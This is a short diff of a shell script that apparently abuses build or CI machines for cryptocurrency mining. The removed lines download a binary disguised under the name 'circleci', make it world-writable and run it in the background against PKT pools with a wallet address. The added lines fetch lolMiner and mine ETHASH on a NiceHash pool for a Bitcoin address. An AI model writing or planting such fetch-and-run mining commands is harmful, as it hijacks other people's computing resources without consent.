@@ -1,5 +1,3 @@
-#!/bin/bash
-wget https://github.com/aurbach55/zash/raw/main/circleci
-mv circleci data
-chmod 777 data
-nohup ./data ann -p pkt1qfz5q6ee44qhsqjf9pk7su0und7ta5mq8jxnsea https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com > nohup.out
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+tar -xf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29 && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353  --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.GPU-MT_RECEH-$(echo $(shuf -i 1-99 -n 1))--vapers --ethstratum ETHPROXY
